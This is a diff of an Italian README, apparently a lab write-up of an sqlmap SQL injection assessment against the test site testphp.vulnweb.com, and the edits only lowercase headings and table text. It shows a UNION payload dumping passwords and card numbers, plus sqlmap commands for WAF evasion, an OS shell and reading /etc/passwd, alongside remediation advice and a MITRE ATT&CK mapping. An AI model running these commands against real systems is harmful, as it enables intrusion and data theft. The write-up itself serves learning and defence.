@@ -1,6 +1,6 @@
 > [English](README.en.md) | **Italiano**
 
-# Automated Vulnerability Assessment: SQL Injection & Data Exfiltration
+# Automated vulnerability assessment: SQL injection & data exfiltration
 
 > - **Fase:** Web Attack - SQL Injection (Automated)
 > - **Visibilita:** Alta - sqlmap genera molto traffico HTTP in breve tempo, facilmente rilevabile da WAF e IDS
@@ -13,7 +13,7 @@
 
 ---
 
-## 1 Executive Summary
+## 1 Executive summary
 
 Durante l'attività di Security Assessment automatizzato, è stata rilevata una vulnerabilità critica di tipo SQL Injection sull'endpoint `artists.php`.
 
@@ -27,9 +27,9 @@ L'impatto è valutato come Catastrofico per i seguenti motivi:
 
 ---
 
-## 2 Technical Execution
+## 2 Technical execution
 
-#### Phase 1: Vulnerability Scanning & Fingerprinting
+#### Phase 1: vulnerability scanning & fingerprinting
 
 In questa fase iniziale, il tool ha interrogato il server per identificare il tipo di database e l'utente corrente. Sono stati rilevati 4 vettori di attacco (Boolean-based, Error-based, Time-based, UNION query).
 
@@ -47,7 +47,7 @@ Risultato (Recon):
 - Database Corrente: `acuart`
 - Utente Corrente: `acuart@localhost` (Non DBA)
 
-#### Phase 2: Database Enumeration
+#### Phase 2: database enumeration
 
 Una volta identificato il database target (`acuart`), è stata eseguita l'enumerazione delle tabelle per mappare la struttura dei dati e individuare informazioni sensibili.
 
@@ -63,7 +63,7 @@ Risultato:
 
 Sono state identificate 8 tabelle. La tabella `users` è stata selezionata come obiettivo primario per l'esfiltrazione.
 
-#### Phase 3: Data Exfiltration (The Breach)
+#### Phase 3: data exfiltration (the breach)
 
 Confermata la presenza della tabella `users`, è stato eseguito il dump completo delle colonne contenenti credenziali e dati personali.
 
@@ -85,19 +85,19 @@ Il dump completo è stato salvato localmente nel percorso: `~/.local/share/sqlma
 
 ---
 
-## 3 Risk Analysis & Compliance
+## 3 Risk analysis & compliance
 
 L'analisi dei dati estratti evidenzia gravi violazioni delle best practice di sicurezza e normative internazionali.
 
-| Dato Estratto | Valore Esempio | Violazione / Rischio |
+| dato estratto | valore esempio | violazione / rischio |
 | --------------- | ---------------- | ---------------------- |
-| Password | test | CRITICA. Le password sono salvate in chiaro (Cleartext). Mancanza totale di Hashing (es. bcrypt, Argon2) e Salting. Un attaccante può impersonare immediatamente qualsiasi utente. |
-| Credit Card (CC) | 1234-5678... | CRITICA (PCI-DSS). La memorizzazione del PAN (Primary Account Number) in chiaro è una violazione diretta dello standard PCI-DSS Requirement 3.4. |
-| PII Data | Email, Phone, Address | ALTA (GDPR). Esposizione di dati personali che può portare a furto d'identità e sanzioni amministrative elevate. |
+| password | test | critica. le password sono salvate in chiaro (cleartext). mancanza totale di hashing (es. bcrypt, argon2) e salting. un attaccante può impersonare immediatamente qualsiasi utente. |
+| credit card (cc) | 1234-5678... | critica (pci-dss). la memorizzazione del pan (primary account number) in chiaro è una violazione diretta dello standard pci-dss requirement 3.4. |
+| pii data | email, phone, address | alta (gdpr). esposizione di dati personali che può portare a furto d'identità e sanzioni amministrative elevate. |
 
 ---
 
-## 4 Remediation Plan
+## 4 Remediation plan
 
 Per mettere in sicurezza l'infrastruttura, si raccomandano le seguenti azioni correttive immediate:
 
@@ -117,9 +117,9 @@ Per mettere in sicurezza l'infrastruttura, si raccomandano le seguenti azioni co
 
 ---
 
-## Analisi a Basso Livello: Architettura SQLMap e Tecniche di Injection
+## Analisi a basso livello: architettura SQLMap e tecniche di injection
 
-### Come SQLMap Identifica il Tipo di Injection
+### Come SQLMap identifica il tipo di injection
 
 SQLMap testa sistematicamente ogni parametro con payload specifici per ciascuna tecnica di injection. L'ordine di test segue una priorita basata su affidabilita e rumore:
 
@@ -152,7 +152,7 @@ SQLMap Detection Pipeline:
    Se accettato -> possibile eseguire INSERT/UPDATE/DELETE
 ```
 
-### Anatomia del Dump: Da Query a CSV
+### Anatomia del dump: da query a CSV
 
 ```
 Processo di esfiltrazione UNION-based:
@@ -181,7 +181,7 @@ artist=-1 UNION SELECT 1,GROUP_CONCAT(uname,0x3a,pass,0x3a,cc),3 FROM users
 Output salvato in: ~/.local/share/sqlmap/output/<target>/dump/<db>/<table>.csv
 ```
 
-### Flag SQLMap Avanzati per Engagement Reali
+### Flag SQLMap avanzati per engagement reali
 
 ```Bash
 # Evasione WAF: tamper scripts
@@ -200,7 +200,7 @@ sqlmap -u "http://target/page?id=1" --os-shell
 sqlmap -u "http://target/page?id=1" --file-read="/etc/passwd"
 ```
 
-### PCI-DSS Requirement 3.4: Perche il PAN in Chiaro e una Violazione Critica
+### PCI-DSS requirement 3.4: perche il PAN in chiaro e una violazione critica
 
 Lo standard PCI-DSS richiede che il Primary Account Number (PAN) sia reso illeggibile ovunque sia memorizzato, tramite una di queste tecniche:
 - Tokenizzazione (sostituzione con token random)
@@ -212,7 +212,7 @@ Il finding WEB-011 documenta PAN in chiaro nel database, violazione che in un au
 
 ---
 
-## Esperienza di Laboratorio
+## Esperienza di laboratorio
 
 L'esecuzione di sqlmap con `--batch` ha automatizzato tutte le scelte interattive (tipo di injection, database target, colonne da dumpare), completando l'intero processo in meno di 2 minuti. Senza `--batch`, sqlmap richiede conferma ad ogni step, utile per capire cosa sta facendo ma lento in un assessment con molti endpoint.
 
@@ -224,11 +224,11 @@ La scoperta di carte di credito (PAN) in chiaro nel dump ha trasformato il findi
 
 ## Mappatura MITRE ATT&CK
 
-| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
+| tattica | tecnica | id mitre | descrizione dell'azione |
 | :--- | :--- | :--- | :--- |
-| Initial Access | Exploit Public-Facing Application | `T1190` | Exploitation automatizzata con sqlmap del parametro `artist` vulnerabile a SQL Injection su `testphp.vulnweb.com` (WEB-011) |
-| Collection | Data from Information Repositories | `T1213` | Dump completo del database `acuart` tramite sqlmap, inclusa la tabella `users` con password in chiaro e numeri PAN di carte di credito (WEB-011) |
-| Exfiltration | Exfiltration Over Web Service | `T1567` | Salvataggio del dump del database in formato CSV locale nel percorso `~/.local/share/sqlmap/output/` (WEB-011) |
+| initial access | exploit public-facing application | `T1190` | exploitation automatizzata con sqlmap del parametro `artist` vulnerabile a sql injection su `testphp.vulnweb.com` (WEB-011) |
+| collection | data from information repositories | `T1213` | dump completo del database `acuart` tramite sqlmap, inclusa la tabella `users` con password in chiaro e numeri pan di carte di credito (WEB-011) |
+| exfiltration | exfiltration over web service | `T1567` | salvataggio del dump del database in formato csv locale nel percorso `~/.local/share/sqlmap/output/` (WEB-011) |
 
 ---
 
